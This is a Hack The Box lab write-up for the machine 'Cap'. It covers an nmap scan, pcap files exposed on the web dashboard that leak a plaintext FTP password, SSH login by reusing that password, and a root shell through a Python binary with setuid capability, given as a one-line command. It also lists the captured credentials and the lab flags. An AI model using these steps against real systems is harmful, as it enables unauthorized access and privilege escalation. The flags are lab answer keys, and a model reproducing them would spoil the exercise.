+++
title = "HTB - Cap"
date = 2026-02-03
+++

### Scan
```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-03 11:18 EST
Nmap scan report for 10.129.11.4
Host is up (0.084s latency).
Not shown: 64216 closed tcp ports (reset), 1316 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.16 seconds
```

### Enumeration
- Looks like we've got a python web instance (Gunicorn, thanks Ipp :)), FTP, and SSH. I'll go FTP -> Web -> SSH i bet.
- Need to authenticate to FTP.
- On web dashboard, a few network functionalities and a user named `nathan`.
- We can see package analysis under `data/1`. Indexed weirdly. Fuzz other numbers?
- `data/0` yields a different scan that we didn't propegate (unlike 1).
- Looking through the `pcap` file, we come across a captured password: `Buck3tH4TF0RM3!`. Reminder that traffic needs to be encrypted over network.
- <img alt="Image" async src="images/Screenshot 2026-02-03 at 11.36.27.png" width="800px"></img>
- We can access the FTP instance now.
- USER: `0c82fc96a52c5f5a2f2d6d34e7dbcd0c`

### Privilege Escalation
- SSH back into the box with the same credentials - `nathan:Buck3tH4TF0RM3!`
- No `sudo` privileges. Serve `linpeas` and browse for interesting files.
- <img alt="Image" async src="images/Screenshot 2026-02-03 at 11.59.00.png" width="800px"></img> 
- This is basically giving python the ability to set its own UID. We can impersonate root user (0) and spawn a shell.
- `/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- ROOT: `4ca1422062146f5ef3a5131b05d1242d`